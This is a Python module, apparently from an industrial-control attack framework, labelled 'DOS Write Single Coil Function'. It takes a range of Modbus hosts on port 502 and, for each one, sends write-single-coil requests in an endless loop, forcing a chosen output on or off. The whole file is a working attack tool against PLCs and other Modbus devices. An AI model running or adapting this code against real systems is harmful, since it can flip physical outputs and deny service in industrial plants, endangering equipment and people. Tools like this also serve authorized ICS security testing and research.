import os
import threading

from System.Core.Global import *
from System.Core.Colors import *
from System.Core.Modbus import *
from System.Lib import ipcalc

class Module:


	info = {
		'Name': 'Write Single Coil',
		'Author': ['@Danel'],
		'Description': ("DOS Write Single Coil Function"),

        }
	options = {
		'RHOSTS'	:[''		,True	,'The target address range or CIDR identifier'],
		'RPORT'		:[502		,False	,'The port number for modbus protocol'],
		'UID'		:[None		,True	,'Modbus Slave UID.'],
		'OutputAddr'	:['0x0000'	,True	,'Output Address from 0x0000 to 0xffff.'],
		'OutputValue'	:['0x0000'	,True	,'Value to write, 0x0000 == Off, 0xFF00 == On.'],
		'Threads'	:[1		,False	,'The number of concurrent threads'],
		'Output'	:[True		,False	,'The stdout save in output directory']
	}	
	output = ''

	def exploit(self):

		moduleName 	= self.info['Name']
		print bcolors.OKBLUE + '[+]' + bcolors.ENDC + ' Module ' + moduleName + ' Start'
		ips = list()
		for ip in ipcalc.Network(self.options['RHOSTS'][0]):
			ips.append(str(ip))
		while ips:
			for i in range(int(self.options['Threads'][0])):
				if(len(ips) > 0):
					thread 	= threading.Thread(target=self.do,args=(ips.pop(0),))
					thread.start()
					THREADS.append(thread)
				else:
					break
			for thread in THREADS:
				thread.join()
		if(self.options['Output'][0]):
			open(mainPath + '/Output/' + moduleName + '_' + self.options['RHOSTS'][0].replace('/','_') + '.txt','a').write('='*30 + '\n' + self.output + '\n\n')
		self.output 	= ''

	def printLine(self,str,color):
		self.output += str + '\n'
		if(str.find('[+]') != -1):
			print str.replace('[+]',color + '[+]' + bcolors.ENDC)
		elif(str.find('[-]') != -1):
			print str.replace('[-]',color + '[+]' + bcolors.ENDC)
		else:
			print str

	def do(self,ip):
		c1 = connectToTarget(ip,self.options['RPORT'][0])
		if(c1 == None):
			self.printLine('[-] Modbus is not running on : ' + ip,bcolors.WARNING)
			return None
		self.printLine('[+] Connecting to ' + ip,bcolors.OKGREEN)
		#closeConnectionToTarget(c)
			
		while True:
			#c1 = connectToTarget(ip,self.options['RPORT'][0])
			ans = c1.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU05_Write_Single_Coil(outputAddr=int(self.options['OutputAddr'][0],16),outputValue=int(self.options['OutputValue'][0],16)),timeout=timeout, verbose=0)
			ans = ModbusADU_Answer(str(ans))
			self.printLine('[+] Response is :',bcolors.OKGREEN)
			ans.show()

			#Cerramos conexion
			#closeConnectionToTarget(c1)

	